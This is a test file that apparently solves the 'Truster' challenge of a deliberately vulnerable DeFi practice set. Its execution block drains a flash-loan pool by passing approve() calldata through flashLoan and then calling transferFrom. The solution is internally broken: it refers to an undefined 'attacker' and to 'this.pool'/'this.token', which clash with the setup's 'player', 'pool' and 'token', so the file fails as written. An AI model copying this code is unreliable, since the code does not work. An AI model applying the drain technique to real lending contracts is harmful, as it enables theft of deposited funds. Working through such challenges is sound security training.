const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, player;
    let token, pool;

    const TOKENS_IN_POOL = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();

        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        pool = await (await ethers.getContractFactory('TrusterLenderPool', deployer)).deploy(token.address);
        expect(await pool.token()).to.eq(token.address);

        await token.transfer(pool.address, TOKENS_IN_POOL);
        expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);

        expect(await token.balanceOf(player.address)).to.equal(0);
    });

    it('Execution', async function () {
        let ABI = [
            "function approve(address,uint256)"
        ];
        let iface = new ethers.utils.Interface(ABI)
        let calldata = iface.encodeFunctionData("approve", [attacker.address, TOKENS_IN_POOL]);

        await network.provider.send("evm_setAutomine", [false]);
        await this.pool.connect(attacker).flashLoan(1, this.pool.address, this.token.address, calldata)

        console.log(await this.token.allowance(this.pool.address, attacker.address))
        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL)
        await network.provider.send("evm_mine", []);
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player has taken all tokens from the pool
        expect(
            await token.balanceOf(player.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await token.balanceOf(pool.address)
        ).to.equal(0);
    });
});

